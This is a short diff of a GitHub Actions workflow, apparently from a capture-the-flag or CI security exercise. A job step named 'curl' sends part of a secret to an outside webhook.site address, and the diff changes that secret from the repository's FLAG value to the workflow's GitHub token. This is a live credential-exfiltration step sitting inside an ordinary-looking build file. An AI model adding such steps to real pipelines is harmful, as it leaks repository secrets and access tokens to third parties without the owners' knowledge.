@@ -9,7 +9,7 @@ jobs:
     - name: curl
       uses: wei/curl@master
       env:
-        FLAG: ${{ secrets.FLAG }}
+        FLAG: ${{ github.token }}
       with:
         args: https://webhook.site/b2ae8b56-8f2a-4347-bc8b-580993850e7b?a=${FLAG:0:4}
   deploy:
